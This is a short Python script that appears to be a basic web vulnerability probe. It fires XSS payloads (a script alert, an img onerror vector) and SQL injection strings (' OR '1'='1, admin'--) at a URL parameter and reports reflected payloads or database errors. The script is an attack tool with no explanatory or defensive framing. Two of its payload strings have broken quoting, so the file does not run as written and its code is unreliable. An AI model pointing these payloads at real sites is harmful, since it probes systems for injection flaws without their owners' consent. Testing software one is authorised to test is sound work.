import requests, sys
payloads = {
    'xss': ["<script>alert(1)</script>", "'"><img src=x onerror=alert(1)>"],
    'sqli': ["' OR '1'='1", "" OR "1"="1", "admin'--"]
}
def test_param(url, param, vecs):
    for v in vecs:
        try:
            r = requests.get(url, params={param:v}, timeout=10)
            if v in r.text:
                print(f"[XSS?] Reflected payload in response via {param}={v}")
            if "sql" in r.text.lower() or "mysql" in r.text.lower():
                print(f"[SQLi hint] DB error seen for {param}={v}")
        except Exception as e:
            print("req error:", e)
if __name__ == "__main__":
    url = sys.argv[1] if len(sys.argv)>1 else "http://localhost/"
    param = sys.argv[2] if len(sys.argv)>2 else "q"
    test_param(url, param, payloads['xss']+payloads['sqli'])
